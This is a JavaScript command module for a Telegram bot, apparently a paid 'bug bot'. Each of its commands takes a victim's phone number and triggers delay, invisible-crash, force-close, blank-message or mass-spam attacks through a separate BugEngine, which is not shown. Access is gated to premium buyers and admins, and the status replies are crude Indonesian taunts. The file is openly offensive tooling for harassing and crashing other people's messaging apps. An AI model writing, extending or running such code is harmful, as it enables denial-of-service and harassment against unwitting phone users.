const BugEngine = require('../utils/bugs');

module.exports = (bot, dataManager) => {
    const bugEngine = new BugEngine(bot);
    const { admins, premiums, senders, gcOnly } = dataManager;

    // Delay Bug
    bot.onText(/\/Dlouisdelay (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const targetNumber = match[1];
        
        if (!dataManager.isAuthorized(userId)) {
            await bot.sendMessage(chatId, '❌ LU GAK PUNYA AKSES BANG! BELI PREMIUM DULU ANJING!');
            return;
        }
        
        if (gcOnly && msg.chat.type === 'group' && !dataManager.isAdmin(userId)) {
            await bot.sendMessage(chatId, '❌ GROUP ONLY MODE AKTIF!');
            return;
        }
        
        await bot.sendMessage(chatId, `🔥 MELAKUKAN DELAY BUG KE ${targetNumber}...`);
        await bugEngine.executeDelayBug(chatId, targetNumber);
        await bot.sendMessage(chatId, `✅ DELAY BUG SELESAI! BOT LU ANJAY!`);
    });

    // Crash Invisible
    bot.onText(/\/Dlouiscrashinvis (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const targetNumber = match[1];
        
        if (!dataManager.isAdmin(userId) && !dataManager.isPremium(userId)) {
            await bot.sendMessage(chatId, '❌ LU BUKAN PREMIUM ASU!');
            return;
        }
        
        await bot.sendMessage(chatId, `💀 MELAKUKAN INVISIBLE CRASH KE ${targetNumber}...`);
        await bugEngine.executeInvisibleBug(chatId, targetNumber);
        await bugEngine.executeCrashBug(chatId, targetNumber);
        await bot.sendMessage(chatId, `☠️ INVISIBLE CRASH COMPLETE! BOT MATI TOTAL!`);
    });

    // Force Close
    bot.onText(/\/Dlouisforcebeta (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const targetNumber = match[1];
        
        if (!dataManager.isAdmin(userId)) {
            await bot.sendMessage(chatId, '❌ ADMIN ONLY! LU GAK BERHAK!');
            return;
        }
        
        await bot.sendMessage(chatId, `⚡ MELAKUKAN FORCE CLOSE KE ${targetNumber}...`);
        await bugEngine.executeForceCloseBug(chatId, targetNumber);
        await bot.sendMessage(chatId, `⚠️ FORCE CLOSE COMPLETE! KONEKSI PUTUS!`);
    });

    // Blank Bug
    bot.onText(/\/Dlouisblank (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const targetNumber = match[1];
        
        if (!dataManager.isAuthorized(userId)) {
            await bot.sendMessage(chatId, '❌ GAK PUNYA AKSES BANG!');
            return;
        }
        
        await bot.sendMessage(chatId, `⬜ MELAKUKAN BLANK BUG KE ${targetNumber}...`);
        await bugEngine.executeBlankBug(chatId, targetNumber);
        await bot.sendMessage(chatId, `⬛ BLANK BUG COMPLETE! SEMUA KOSONG!`);
    });

    // Crash Notif
    bot.onText(/\/Dlouiscrash (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const targetNumber = match[1];
        
        if (!dataManager.isAdmin(userId)) {
            await bot.sendMessage(chatId, '❌ ADMIN ONLY!');
            return;
        }
        
        await bot.sendMessage(chatId, `💥 MELAKUKAN CRASH BUG KE ${targetNumber}...`);
        await bugEngine.executeCrashBug(chatId, targetNumber);
        await bot.sendMessage(chatId, `🔥 CRASH BUG COMPLETE! NOTIF BANJIR!`);
    });

    // Super Spam
    bot.onText(/\/Dlouisspam (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const targetNumber = match[1];
        
        if (!dataManager.isAdmin(userId)) {
            await bot.sendMessage(chatId, '❌ ADMIN ONLY!');
            return;
        }
        
        await bot.sendMessage(chatId, `📨 MELAKUKAN SUPER SPAM ${targetNumber}...`);
        await bugEngine.superSpam(chatId, parseInt(targetNumber));
        await bot.sendMessage(chatId, `📩 SUPER SPAM COMPLETE!`);
    });
};
